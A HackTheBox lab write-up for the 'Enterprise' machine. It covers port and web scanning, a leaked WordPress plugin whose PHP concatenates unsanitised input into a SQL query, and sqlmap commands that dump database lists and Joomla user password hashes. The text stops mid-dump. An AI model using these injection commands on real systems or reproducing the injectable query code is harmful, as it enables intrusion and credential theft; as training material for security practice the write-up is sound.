---
title: Enterprise Writeup- HackTheBox
author: pwnd_root
date: 2020-07-23 14:30:00 +0530
excerpt: A linux box from HackTheBox- owned through SQL Injection and Buffer overflow.
thumbnail: /assets/img/posts/enterprise/info.png
categories: [HackTheBox,Retired]
tags: [htb, linux, sqli, lcars, buffer overflow, without metasploit]
---

*[Image: Info Card]*

## Methodology
1. Ports Enumeration
2. Web services Enumeration
3. Identified SQLi
4. Foothold gained
5. 'lcars' service identified
6. Buffer overflow identified
7. ROOT shell gained

## Ports Enumeration
The usual reconnaissance of the target had identified 4 open services- ssh (22), http (80), https (443) and http-proxy 
(8080). Additionally, the scan had not identified any interesting vulnerabilities.
```
[pwnd_root@manjaro Enterprise]$ targetRecon 10.10.10.61 
[+] Open Ports Scan 
        22      ssh 
        80      http 
        443     https 
        8080    http-proxy 
[+] Scripts Scan 
                 nmap -sV -A --script=default,vuln -p 22 10.10.10.61 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 13:45 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.61 (10.10.10.61) 
Host is up (0.34s latency). 
 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA) 
|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA) 
|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 46.00 seconds 
 
                 nmap -sV -A --script=default,vuln -p 80 10.10.10.61 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 13:45 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.61 (10.10.10.61) 
Host is up (0.32s latency). 
 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.10 ((Debian)) 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
| http-enum:                                                                                                                                                                      
|   /wp-login.php: Possible admin folder                                                                                                                                          
|   /readme.html: Wordpress version: 2                                                                                                                                            
|   /: WordPress version: 4.8.1                                                                                                                                                   
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.                                                                                                                     
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.                                                                                                               
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.                                                                                                                   
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.                                                                                                                
|   /wp-login.php: Wordpress login page.                                                                                                                                          
|   /wp-admin/upgrade.php: Wordpress login page.                                                                                                                                  
|_  /readme.html: Interesting, a readme.                                                                                                                                          
|_http-generator: WordPress 4.8.1                                                                                                                                                 
|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                      
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: USS Enterprise &#8211; Ships Log                                                                                                                                    
| vulners:                                                                                                                                                                        
|   cpe:/a:apache:http_server:2.4.10:                                                                                                                                             
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679                                                                                                             
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668                                                                                                             
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169                                                                                                             
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167                                                                                                             
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312                                                                                                             
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715                                                                                                            
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788                                                                                                             
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217                                                                                                             
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927                                                                                                             
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098                                                                                                            
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934                                                                                                             
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220                                                                                                             
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199                                                                                                            
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798                                                                                                             
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710                                                                                                            
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743                                                                                                             
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161                                                                                                             
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736                                                                                                             
|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583                                                                                                             
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092                                                                                                            
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975                                                                                                             
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185                                                                                                             
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109                                                                                                             
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283                                                                                                             
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612                                                                                                             
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 95.38 seconds                                                                                                                      
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 443 10.10.10.61 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 13:47 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.61 (10.10.10.61)                                                                                                                                    
Host is up (0.34s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT    STATE SERVICE  VERSION                                                                                                                                                    
443/tcp open  ssl/http Apache httpd 2.4.25 ((Ubuntu))                                                                                                                             
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                              
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
| http-enum:                                                                                                                                                                      
|_  /files/: Potentially interesting directory w/ listing on 'apache/2.4.25 (ubuntu)'                                                                                             
|_http-server-header: Apache/2.4.25 (Ubuntu)                                                                                                                                      
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                               
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK                                  
| Not valid before: 2017-08-25T10:35:14                                                                                                                                           
|_Not valid after:  2017-09-24T10:35:14                                                                                                                                           
|_ssl-date: TLS randomness does not represent time                                                                                                                                
|_sslv2-drown:                                                                                                                                                                    
| tls-alpn:                                                                                                                                                                       
|_  http/1.1                                                                                                                                                                      
| vulners:                                                                                                                                                                        
|   cpe:/a:apache:http_server:2.4.25:                                                                                                                                             
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679                                                                                                             
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668                                                                                                             
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169                                                                                                             
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167                                                                                                             
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211                                                                                                             
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312                                                                                                             
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715                                                                                                            
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082                                                                                                            
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788                                                                                                             
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217                                                                                                             
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927                                                                                                             
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098                                                                                                            
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934                                                                                                             
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081                                                                                                            
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220                                                                                                             
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196                                                                                                             
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199                                                                                                            
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333                                                                                                             
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798                                                                                                             
|       CVE-2017-7659   5.0     https://vulners.com/cve/CVE-2017-7659                                                                                                             
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710                                                                                                            
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197                                                                                                             
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092                                                                                                            
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763                                                                                                            
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283                                                                                                             
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 134.06 seconds                                                                                                                     
                                                                                                                                                                                  
                 nmap -sV -A --script=default,vuln -p 8080 10.10.10.61 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-22 13:49 IST                                                                                                                   
Pre-scan script results:                                                                                                                                                          
| broadcast-avahi-dos:                                                                                                                                                            
|   Discovered hosts:                                                                                                                                                             
|     224.0.0.251                                                                                                                                                                 
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                              
|_  Hosts are all up (not vulnerable).                                                                                                                                            
Nmap scan report for 10.10.10.61 (10.10.10.61)                                                                                                                                    
Host is up (0.31s latency).                                                                                                                                                       
                                                                                                                                                                                  
PORT     STATE SERVICE VERSION                                                                                                                                                    
8080/tcp open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                             
| http-csrf:                                                                                                                                                                      
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.61                                                                                                       
|   Found the following possible CSRF vulnerabilities:                                                                                                                            
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/                                                                                                                                              
|     Form id: login-form                                                                                                                                                         
|     Form action: /index.php                                                                                                                                                     
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/about                                                                                                                               
|     Form id: login-form                                                                                                                                                         
|     Form action: /index.php/about                                                                                                                                               
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/2-uncategorised/1-romulan-ale                                                                                                       
|     Form id: login-form                                                                                                                                                         
|     Form action: /index.php                                                                                                                                                     
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php                                                                                                                                     
|     Form id: login-form                                                                                                                                                         
|     Form action: /index.php                                                                                                                                                     
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/component/users/?view=remind&amp;Itemid=101                                                                                         
|     Form id: user-registration                                                                                                                                                  
|     Form action: /index.php/component/users/?task=remind.remind&Itemid=101                                                                                                      
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/component/users/?view=remind&amp;Itemid=101                                                                                         
|     Form id: login-form                                                                                                                                                         
|     Form action: /index.php/component/users/?Itemid=101                                                                                                                         
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/component/users/?view=reset&amp;Itemid=101                                                                                          
|     Form id: user-registration                                                                                                                                                  
|     Form action: /index.php/component/users/?task=reset.request&Itemid=101                                                                                                      
|                                                                                                                                                                                 
|     Path: http://10.10.10.61:8080/index.php/component/users/?view=reset&amp;Itemid=101                                                                                          
|     Form id: login-form                                                                                                                                                         
|_    Form action: /index.php/component/users/?Itemid=101                                                                                                                         
|_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                             
| http-enum:                                                                                                                                                                      
|   /administrator/: Possible admin folder                                                                                                                                        
|   /administrator/index.php: Possible admin folder                                                                                                                               
|   /1.sql: Possible database backup                                                                                                                                              
|   /robots.txt: Robots file                                                                                                                                                      
|   /administrator/manifests/files/joomla.xml: Joomla version 3.7.5                                                                                                               
|   /language/en-GB/en-GB.xml: Joomla version 3.7.5                                                                                                                               
|   /htaccess.txt: Joomla!                                                                                                                                                        
|   /README.txt: Interesting, a readme.                                                                                                                                           
|   /0/: Potentially interesting folder                                                                                                                                           
|   /1/: Potentially interesting folder                                                                                                                                           
|   /2/: Potentially interesting folder                                                                                                                                           
|   /bin/: Potentially interesting folder                                                                                                                                         
|   /cache/: Potentially interesting folder                                                                                                                                       
|   /home/: Potentially interesting folder                                                                                                                                        
|   /images/: Potentially interesting folder                                                                                                                                      
|   /includes/: Potentially interesting folder                                                                                                                                    
|   /libraries/: Potentially interesting folder                                                                                                                                   
|   /modules/: Potentially interesting folder                                                                                                                                     
|   /templates/: Potentially interesting folder                                                                                                                                   
|_  /tmp/: Potentially interesting folder                                                                                                                                         
|_http-generator: Joomla! - Open Source Content Management                                                                                                                        
| http-internal-ip-disclosure:                                                                                                                                                    
|_  Internal IP Leaked: 172.17.0.3                                                                                                                                                
|_http-open-proxy: Proxy might be redirecting requests                                                                                                                            
| http-robots.txt: 15 disallowed entries                                                                                                                                          
| /joomla/administrator/ /administrator/ /bin/ /cache/                                                                                                                            
| /cli/ /components/ /includes/ /installation/ /language/                                                                                                                         
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/                                                                                                                          
|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                      
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Home                                                                                                                                                                
| vulners:                                                                                                                                                                        
|   cpe:/a:apache:http_server:2.4.10:                                                                                                                                             
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679                                                                                                             
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668                                                                                                             
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169                                                                                                             
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167                                                                                                             
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312                                                                                                             
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715                                                                                                            
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788                                                                                                             
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217                                                                                                             
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927                                                                                                             
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098                                                                                                            
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934                                                                                                             
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220                                                                                                             
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199                                                                                                            
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798                                                                                                             
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710                                                                                                            
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743                                                                                                             
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161                                                                                                             
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736                                                                                                             
|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583                                                                                                             
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092                                                                                                            
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975                                                                                                             
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185                                                                                                             
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109                                                                                                             
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283                                                                                                             
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612                                                                                                             
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 398.39 seconds                                                                                                                     
                                                                                                                                                                                  
[+] Summary  
22      ssh     OpenSSH 7.4p1 Ubuntu 10 
                No vuln found 
80      http    Apache httpd 2.4.10 
                No vuln found 
443     https   Apache httpd 2.4.25 
                No vuln found 
8080    http-proxy      Apache httpd 2.4.10 
                No vuln found
```

## Web Service Enumeration
The HTTP and HTTPS services, were both subjected to *nikto* scans and directory brute-forcing. The results of
the HTTP service had revealed that it is running *WordPress*, and some WordPress related directories. The results of the
HTTPS service had revealed an interesting directory- *files*. The http-proxy on port 8080 is hosting *Joomla CMS*.

### HTTP Service
``` 
[pwnd_root@manjaro Enterprise]$ nikto -host http://10.10.10.61 
- Nikto v2.1.6 
--------------------------------------------------------------------------- 
+ Target IP:          10.10.10.61 
+ Target Hostname:    10.10.10.61 
+ Target Port:        80 
+ Start Time:         2020-07-22 15:53:38 (GMT5.5) 
--------------------------------------------------------------------------- 
+ Server: Apache/2.4.10 (Debian) 
+ Retrieved x-powered-by header: PHP/5.6.31 
+ The anti-clickjacking X-Frame-Options header is not present. 
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS 
+ Uncommon header 'link' found, with contents: <http://enterprise.htb/index.php?rest_route=/>; rel="https://api.w.org/" 
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type 
+ No CGI Directories found (use '-C all' to force check all possible dirs) 
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current. 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives. 
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80  
+ OSVDB-3233: /icons/README: Apache default file found. 
+ OSVDB-62684: /wp-content/plugins/hello.php: The WordPress hello.php plugin reveals a file system path 
+ /wp-links-opml.php: This WordPress script reveals the installed version. 
+ OSVDB-3092: /license.txt: License file found may identify site software. 
+ Cookie wordpress_test_cookie created without the httponly flag 
+ /wp-login.php: Wordpress login found 
+ 7499 requests: 0 error(s) and 14 item(s) reported on remote host 
+ End Time:           2020-07-22 16:30:33 (GMT5.5) (2215 seconds) 
--------------------------------------------------------------------------- 
+ 1 host(s) tested
```
A **wpscan** was run against the target, which had identified an username, **william.riker**. The scan did not identify any other
interesting information about the target.
``` 
[pwnd_root@manjaro Enterprise]$ wpscan -e --url http://10.10.10.61 
_______________________________________________________________ 
         __          _______   _____ 
         \ \        / /  __ \ / ____| 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ® 
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
            \  /\  /  | |     ____) | (__| (_| | | | | 
             \/  \/   |_|    |_____/ \___|\__,_|_| |_| 
 
         WordPress Security Scanner by the WPScan Team 
                         Version 3.8.2 
       Sponsored by Automattic - https://automattic.com/ 
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart 
_______________________________________________________________ 
 
[+] URL: http://10.10.10.61/ [10.10.10.61] 
[+] Started: Wed Jul 22 16:04:10 2020 
 
Interesting Finding(s): 
---SNIP---
[i] User(s) Identified: 
[+] william-riker 
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) 
```

### HTTPS Service
``` 
[pwnd_root@manjaro Enterprise]$ nikto -host https://10.10.10.61
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.61
+ Target Hostname:    10.10.10.61
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=United Federation of Planets/L=Earth/O=USS Enterprise/OU=Bridge/CN=enterprise.local/emailAddress=jeanlucpicard@enterprise.local
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=United Federation of Planets/L=Earth/O=USS Enterprise/OU=Bridge/CN=enterprise.local/emailAddress=jeanlucpicard@enterprise.local
+ Start Time:         2020-07-22 15:53:51 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5579166a49cfd 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Hostname '10.10.10.61' does not match certificate's names: enterprise.local
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7500 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2020-07-22 21:05:07 (GMT5.5) (18676 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
As can be seen from the results of the *nikto* scan, the https service is hosting an interesting directory- **files**.
Browsing to [https://10.10.10.61/files](https://10.10.10.61/files) listed a single *zip* file, **lcars.zip**. The same 
was downloaded, unzipped and enumerated for useful information. The zip file held three *php* files, presumably source 
codes.
```shell  
[pwnd_root@manjaro Enterprise]$ unzip lcars.zip  
Archive:  lcars.zip 
  inflating: lcars/lcars_db.php       
  inflating: lcars/lcars_dbpost.php   
  inflating: lcars/lcars.php          
[pwnd_root@manjaro Enterprise]$ cd lcars 
[pwnd_root@manjaro lcars]$ l 
total 12 
-rw-r--r-- 1 pwnd_root pwnd_root 501 Oct 17  2017 lcars_db.php 
-rw-r--r-- 1 pwnd_root pwnd_root 624 Oct 17  2017 lcars_dbpost.php 
-rw-r--r-- 1 pwnd_root pwnd_root 377 Oct 17  2017 lcars.php
```
 The files were individually read-through and the contents are listed below.
<br>
 ***lcars.php***
 <br>
 This file is a WordPress plugin named *lcars* and the contents are given below.
 ``` php
<?php 
/* 
*     Plugin Name: lcars 
*     Plugin URI: enterprise.htb 
*     Description: Library Computer Access And Retrieval System 
*     Author: Geordi La Forge 
*     Version: 0.2 
*     Author URI: enterprise.htb 
*                              */ 
 
// Need to create the user interface.  
 
// need to finsih the db interface 
 
// need to make it secure 
 
?>  
```
 ***lcars_db.php***
<br>
This file is a support file that converts user input into *MySQL* query, runs them on the database and returns the post that 
was searched for. However, the user input- *query* does not get sanitized, leading to ***SQL Injection vulnerability***. 

```php
<?php 
include "/var/www/html/wp-config.php"; 
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); 
// Test the connection: 
if (mysqli_connect_errno()){ 
    // Connection Error 
    exit("Couldn't connect to the database: ".mysqli_connect_error()); 
} 
 
 
// test to retireve an ID 
if (isset($_GET['query'])){ 
    $query = $_GET['query']; 
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query"; 
    $result = $db->query($sql); 
    echo $result; 
} else { 
    echo "Failed to read query"; 
} 
 
 
?>
```
 ***lcars_dbpost.php***

This file is essentially just a rehash of *lcars_dp.php*, with the exception that user input gets type casted into an 
integer. Therefore, this queries the posts based on IDs and not on post names. Also note, the user input does not get 
sanitized here, either.
```php
<?php 
include "/var/www/html/wp-config.php"; 
$db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); 
// Test the connection: 
if (mysqli_connect_errno()){ 
    // Connection Error 
    exit("Couldn't connect to the database: ".mysqli_connect_error()); 
} 
 
 
// test to retireve a post name 
if (isset($_GET['query'])){ 
    $query = (int)$_GET['query']; 
    $sql = "SELECT post_title FROM wp_posts WHERE ID = $query"; 
    $result = $db->query($sql); 
    if ($result){ 
        $row = $result->fetch_row(); 
        if (isset($row[0])){ 
            echo $row[0]; 
        } 
    } 
} else { 
    echo "Failed to read query"; 
} 
 
 
?> 
```
## SQL Injection
From the previous section, it was identified that by using the keyword *query* on *lcars_dp.php*, an SQL injection can 
be injected into the host. Browsing to [http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1]( http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1)
confirmed the injection vulnerability.
*[Image: SQLi Confirmation]*
Using *sqlmap*, the injection vulnerability was exploited to dump the databases as
```sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms=mysql --dbs``` and the results are 
given below.
```shell 
[pwnd_root@manjaro Enterprise]$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms=mysql --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:57:01 /2020-07-22/

[18:57:01] [INFO] testing connection to the target URL
---SNIP---
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb

[18:57:03] [INFO] fetched data logged to text files under '/home/pwnd_root/.sqlmap/output/10.10.10.61'
[18:57:03] [WARNING] you haven't updated sqlmap for more than 92 days!!!

[*] ending @ 18:57:03 /2020-07-22/
```
From the results, the databases *joomladb* and *wordpress* seemed more promising and hence they were enumerated first.
The results from every SQL dump is given on the following sections.
<br> **joomladb-** ***edz2g_users***
 ```shell 
[pwnd_root@manjaro Enterprise]$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms=mysql -D joomladb -T edz2g_users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:04:46 /2020-07-22/

[19:04:47] [INFO] testing connection to the target URL
---SNIP---
Database: joomladb
Table: edz2g_users
[2 entries]
+------+---------+-------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+-----------------+-----------+--------------------------------------------------------------+------------+------------+---------------------+--------------+---------------------+---------------------+
| id   | otep    | block | email                          | name       | otpKey  | params                                                                                       | username        | sendEmail | password                                                     | activation | resetCount | registerDate        | requireReset | lastResetTime       | lastvisitDate       |
+------+---------+-------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+-----------------+-----------+--------------------------------------------------------------+------------+------------+---------------------+--------------+---------------------+---------------------+
| 400  | <blank> | 0     | geordi.la.forge@enterprise.htb | Super User | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | geordi.la.forge | 1         | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | 0          | 0          | 2017-09-03 19:30:04 | 0            | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 |
| 401  | <blank> | 0     | guinan@enterprise.htb          | Guinan     | <blank> | {"admin_style":"","admin_language":"","language":"","editor":"","helpsite":"","timezone":""} | Guinan          | 0         | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | <blank>    | 0          | 2017-09-06 12:38:03 | 0            | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 |
+------+---------+-------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+-----------------+-----------+--------------------------------------------------------------+------------+------------+---------------------+--------------+---------------------+---------------------+

[19:05:11] [INFO] table 'joomladb.edz2g_users' dumped to CSV file '/home/pwnd_root/.sqlmap/output/10.10.10.61/dump/joomladb/edz2g_users.csv'
[19:05:11] [INFO] fetched data logged to text files under '/home/pwnd_root/.sqlmap/output/10.10.10.61'
[19:05:11] [WARNING] you haven't updated sqlmap for more than 92 days!!!

[*] ending @ 19:05:11 /2020-07-22/
```
**wordpress-** ***wp_users***
``` shell 
[pwnd_root@manjaro Enterprise]$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms=mysql -D wordpress -T wp_users --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

